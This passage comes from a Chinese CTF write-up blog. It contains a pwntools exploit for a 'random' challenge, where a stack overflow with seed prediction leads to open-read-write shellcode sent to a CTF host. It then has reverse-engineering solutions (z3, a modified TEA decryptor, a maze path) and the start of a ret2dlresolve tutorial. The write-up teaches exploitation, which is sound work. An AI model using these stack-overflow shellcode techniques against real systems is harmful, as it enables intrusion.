punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><ul><li>开了沙盒，禁掉了execv函数</li><li>时间种子产生随机数，有100次机会</li><li>保护全关</li><li>存在<code>call rsi</code>，<code>jmp rsp</code>指令</li></ul><blockquote><p>（爆破+）orw</p><p>cdll模拟</p></blockquote><p>程序漏洞点：</p><p>程序存在栈溢出，但是溢出字节只有 0x40 - 0x20 - 0x8 = 0x18字节，且buf只有 0x28个字节，不足以写下orw；<strong>所以我们得想办法把orw写到栈上的某个位置，然后在将程序执行流劫持过去</strong></p><p><img src="/2023/04/20/gdouctf-wp/2.png"></p><p>但是栈地址怎么确定呢？<del>秒，太妙了</del></p><p><strong>在vulnerable函数中，最后调用了read函数，由64位传参可以知道：rsi = buf_addr；并且经过动态调试可以发现，在read函数执行完后，rsi的值并没有改变，依然指向buf开始的地址，而rsi又是read的第二个参数，所以我们只需要让<code>rsi+xx</code>就可以把orw写入栈上了</strong>，所以我们根本不用泄漏栈地址</p><p><img src="/2023/04/20/gdouctf-wp/4.png" alt="read调用前"></p><p><img src="/2023/04/20/gdouctf-wp/5.png" alt="read调用后"></p><p>最终思路如下：</p><p><strong>我们将read函数写入buf开始处，然后将返回地址覆盖为<code>call rsi或者利用sub rsp,xx;jmp rsp</code>，所以最后程序会跳到buf处并执行read函数将orw写入栈中某个位置A处，然后在<code>call rsi;(或jmp rsi)</code>将执行流劫持到orw处即A处</strong></p><p>当然我们也可也泄漏栈地址：即泄漏寄存器中的栈地址</p><p><img src="/2023/04/20/gdouctf-wp/3.png" alt="栈内布局"></p><p>exp：这个脚本远程<code>call rsi;jmp rsp</code>都可以通；但是本地<code>call rsi</code>通不了，但是使用<code>jmp rsp</code>可以通&gt;_&lt;</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./RANDOM"</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./RANDOM"</span><span class="token punctuation">)</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node2.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28511</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./RANDOM"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libcjmp_rsp <span class="token operator">=</span> <span class="token number">0x000000000040094e</span> <span class="token comment">#jmp rsp</span>call_rsi <span class="token operator">=</span> <span class="token number">0x0000000000400c23</span> <span class="token comment">#call rsi</span>cs <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>cs<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>cs<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#ORW组合，大小为0x50</span>flag_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x200</span>orw  <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>orw <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'rax'</span><span class="token punctuation">,</span> flag_addr<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>orw <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> flag_addr<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    xor rax, rax    xor rdi, rdi    add rsi, 0x100 /*程序执行完自己的read函数后，rsi的值仍然指向buf开始处，所以这里我们给rsi+0x100这个地址还是在栈上*/    push 0x100    pop rdx    syscall    jmp rsi'''</span><span class="token comment">#payload = asm(shellcode).ljust(0x28, b'A') + p64(jmp_rsp) + asm('sub rsp,0x30;jmp rsp')</span>payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'A'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>call_rsi<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'num:\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>cs<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'door\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>orw<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Check-your-luck"><a href="#Check-your-luck" class="headerlink" title="Check_your_luck"></a>Check_your_luck</h2><p>z3求解方程组</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>v<span class="token punctuation">,</span> w<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z <span class="token operator">=</span> Ints<span class="token punctuation">(</span><span class="token string">'v w x y z'</span><span class="token punctuation">)</span>ans <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>ans<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">23</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">32</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">98</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">55</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">90</span> <span class="token operator">==</span> <span class="token number">333322</span><span class="token punctuation">)</span>ans<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">123</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">322</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">68</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">67</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">==</span> <span class="token number">707724</span><span class="token punctuation">)</span>ans<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">266</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">34</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">43</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">==</span> <span class="token number">1272529</span><span class="token punctuation">)</span>ans<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">343</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">352</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">58</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">65</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">==</span> <span class="token number">1672457</span><span class="token punctuation">)</span>ans<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">231</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">321</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">938</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">555</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">970</span> <span class="token operator">==</span> <span class="token number">3372367</span><span class="token punctuation">)</span>check <span class="token operator">=</span> ans<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#4、检测是否有解（有解sat、无解unsat）</span><span class="token keyword">print</span><span class="token punctuation">(</span>check<span class="token punctuation">)</span>model <span class="token operator">=</span> ans<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#5、取出所有结果，一个ModelRef类，</span><span class="token keyword">print</span><span class="token punctuation">(</span>model<span class="token punctuation">)</span><span class="token string">"NSSCTF{4544_123_677_1754_777}"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h2><p>魔改tea，可以找到key和密文</p><ul><li>key = [2233, 4455, 6677, 8899]</li><li>密文v8：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1A800BDA</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xF7A6219B</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x491811D8</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xF2013328</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x156C365B</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3C6EAAD8</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x84D4BF28</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xF11A7EE7</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3313B252</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xDD9FE279</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加密算法如下：<strong>注意do_while循环一共执行了33次</strong></p><p><img src="/2023/04/20/gdouctf-wp/6.png"></p><p>将解密后的数据<strong>逐字节输出</strong>：</p><p><img src="/2023/04/20/gdouctf-wp/7.png"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">sub_140011900</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> <span class="token operator">*</span>key<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+44h] [rbp+24h]</span><span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+64h] [rbp+44h]</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+84h] [rbp+64h]</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+C4h] [rbp+A4h]</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> i <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>v6 <span class="token operator">=</span> <span class="token number">0xF462900</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//do_while一共执行了33次哦</span>v3 <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">do</span><span class="token punctuation">{</span><span class="token operator">++</span>v5<span class="token punctuation">;</span>v6 <span class="token operator">-=</span> <span class="token number">0xF462900</span><span class="token punctuation">;</span>a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>v6 <span class="token operator">&gt;&gt;</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> v6 <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> key<span class="token punctuation">[</span>v6<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>v5 <span class="token operator">&lt;=</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">uint32_t</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">2233</span><span class="token punctuation">,</span> <span class="token number">4455</span><span class="token punctuation">,</span> <span class="token number">6677</span><span class="token punctuation">,</span> <span class="token number">8899</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token class-name">uint32_t</span> v8<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1A800BDA</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xF7A6219B</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x491811D8</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xF2013328</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x156C365B</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3C6EAAD8</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x84D4BF28</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xF11A7EE7</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3313B252</span><span class="token punctuation">;</span>v8<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xDD9FE279</span><span class="token punctuation">;</span><span class="token function">sub_140011900</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>k<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> m <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>m<span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v8<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//HZCTF{hzCtf_94_re666fingcry5641qq}</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="doublegame-–-暂时有点没搞懂这个迷宫的逻辑"><a href="#doublegame-–-暂时有点没搞懂这个迷宫的逻辑" class="headerlink" title="doublegame – 暂时有点没搞懂这个迷宫的逻辑"></a>doublegame – 暂时有点没搞懂这个迷宫的逻辑</h2><p>迷宫题套了个贪吃蛇：flag = HZCTF{md5(path)+score}</p><p><img src="/2023/04/20/gdouctf-wp/8.png"></p><p>找到贪吃蛇分数比较逻辑：score = 13371337</p><p><img src="/2023/04/20/gdouctf-wp/9.png"></p><p>迷宫地图：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">000000000000000000000</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">0</span> <span class="token number">0</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">00000</span> <span class="token number">00000</span> <span class="token number">0</span> <span class="token number">0</span><span class="token number">0</span> <span class="token number">0</span>               <span class="token number">0</span> <span class="token number">0</span><span class="token number">0</span> <span class="token number">000</span> <span class="token number">000</span> <span class="token number">0</span> <span class="token number">000</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span><span class="token number">0</span> <span class="token number">0</span>     <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span>   <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">00000</span> <span class="token number">000</span> <span class="token number">000</span> <span class="token number">0</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span>     <span class="token number">0</span>   <span class="token number">0</span> <span class="token number">0</span>    <span class="token number">0</span> <span class="token number">000</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">000</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span><span class="token number">0</span>     <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span><span class="token number">0</span> <span class="token number">00000</span> <span class="token number">000</span> <span class="token number">000</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span><span class="token number">0</span>     <span class="token number">0</span>       <span class="token number">0</span>   <span class="token number">0</span> <span class="token number">0</span><span class="token number">000</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">000</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token operator">*</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span><span class="token number">0</span> <span class="token number">0000000</span> <span class="token number">0</span> <span class="token number">000</span> <span class="token number">00000</span>@   <span class="token number">0</span>   <span class="token number">0</span> <span class="token number">0</span>         <span class="token number">0</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">00000000000</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span>             <span class="token number">0</span><span class="token number">000</span> <span class="token number">0</span> <span class="token number">00000</span> <span class="token number">0</span> <span class="token number">000</span> <span class="token number">000</span><span class="token number">0</span>         <span class="token number">0</span> <span class="token number">0</span>   <span class="token number">0</span>   <span class="token number">0</span><span class="token number">000000000000000000000</span><span class="token comment">/*dddssssddwwwwddssddwwwwwwddddssaassddddwwwwddwwwwddd*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2_dl_runtime_resolve</title>
      <link href="/2023/04/19/ret2-dl-runtime-resolve/"/>
      <url>/2023/04/19/ret2-dl-runtime-resolve/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://hollk.blog.csdn.net/article/details/106996893">https://hollk.blog.csdn.net/article/details/106996893</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/</a></p><p><a href="https://xz.aliyun.com/t/5122">https://xz.aliyun.com/t/5122</a></p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>我们知道在 linux 中是利<strong>用<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code> 来对动态链接的函数进行重定位的。</strong>那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了。这种方法多用在可泄漏函数不多的情况下，经典例子只有read函数。</p><h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>动态链接比静态链接灵活，但是牺牲了一部分性能的代价：</p><ul><li>因为动态链接下对于全局和静态的数据访问都要进行复杂的GOT定位，然后间接寻址，对于模块间的调用也要先定位GOT，然后在进行间接跳转，所以速度会慢；</li><li>另外一个原因是<strong>动态链接的链接工作是在运行时完成的</strong>，动态链接器会寻找并装载所欲需要的共享对象，然后进行符号查找、地址定位等工作，这些工作会减慢程序的启动速度。</li></ul><p>为了解决上面动态链接的弊端，ELF采用了一种叫做<strong>延迟绑定（Lazy Binding）</strong>的做法，<strong>基本思想就是当函数第一次被用到时才进行绑定（符号查找、重定位等），如果没有用到则不进行绑定。</strong>所以程序开始时，模块间的函数调用都没有进行绑定，而是需要用到时才由动态链接器来负责绑定。</p><p>ELF使用PLT（Procedure Linkage Table）的方法来实现，在这之前，先从动态链接器的角度设想一下：假设需要调用lib.so中的func()函数，那么当lib.so中第一次调用func()时，这时候就需要调用动态链接器中的某个函数来完成地址绑定工作，假设这个函数叫做lookup()，那么lookup()需要知道这个地址绑定发生在哪个模块、哪个函数。假设lookup()的原型为lookup(module，function)，两个参数分别是lib.so和func()。在Glibc中，lookup()函数真正的名字叫做**<code>_dl_runtime_resolve() </code>。**</p><p><strong>当我们调用某个外部模块的函数时，PLT为了实现延迟绑定，在这个过程中有增加了一层间接跳转。调用函数并不直接通过GOT跳转，而是通过一个叫做PLT项的结构来进行跳转，每个外部函数在PLT中都有一个相应的项，比如func1()函数在PLT中的项的地址称之为func@plt：</strong></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">func@plt:jmp *(func@GOT)push npush moduleIDjump __dl_runtime_resolve<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong><code>func@plt</code>的第一条指令是一条通过GOT间接跳转的指令，<code>func@GOT</code>表示GOT中保存func()这个函数相应的项。若链接器在初始化阶段已经初始化该项，并且将func()的地址填入该项，那么这个跳转指令的结果就是我们所期望的，跳转到func()，实现函数正确调用。但是为了实现延迟绑定，链接器在初始化并没有将func()的地址填入到该项，而是将第二条指令<code>push n</code>的地址填入到func@GOT中，这个步骤不需要任何符号，所以代价很低。</strong></p><ul><li>第一条指令的效果是跳转到提二条指令，相当于没有任何操作。</li><li>第二条指令将一个数字n压入栈中，这个数字是func这个符号引用在重定位表<code>.rel.plt</code>中的下标</li><li>第三条push指令将模块的ID压入到栈中</li><li>第四条跳转到<code>_dl_runtime_resolve()</code><ul><li>也就是在实现前面提到的<code>lookup(module, 